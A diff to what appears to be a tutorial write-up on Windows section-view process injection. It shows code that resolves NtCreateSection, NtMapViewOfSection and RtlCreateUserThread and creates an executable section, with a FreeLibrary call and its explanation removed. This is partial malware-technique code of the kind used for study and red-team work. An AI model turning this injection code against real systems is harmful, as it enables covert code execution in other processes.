@@ -38,7 +38,6 @@ int inject_section_view(DWORD pid) {
 	NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(hNtdll, "NtCreateSection");
     NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(hNtdll, "NtMapViewOfSection");
 	RtlCreateUserThread_t pRtlCreateUserThread = (RtlCreateUserThread_t) GetProcAddress(hNtdll, "RtlCreateUserThread");
-    FreeLibrary(hNtdll);
 
     // Create and map Section
 	status = pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &payload_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
@@ -57,7 +56,7 @@ int inject_section_view(DWORD pid) {
 }
 ```
 
-The program can be roughly divided into three parts. We begin with dynamically resolving the addresses of  `NtCreateSection`, `NtMapViewOfSection` and `RtlCreateUserThread` from `NtDLL` using a combination of `GetModuleHandle()` and `GetProcAddress()`. Once we have the addresses we need, we free the module handle with `FreeLibrary()` because that is the right thing to do 🥰
+The program can be roughly divided into three parts. We begin with dynamically resolving the addresses of  `NtCreateSection`, `NtMapViewOfSection` and `RtlCreateUserThread` from `NtDLL` using a combination of `GetModuleHandle()` and `GetProcAddress()`.
 
 Next up, we use `NtCreateSection()` to create a section object with the following parameters: 
 - `&hSection`: This is a pointer to a HANDLE variable that will receive the handle to the created section object. 
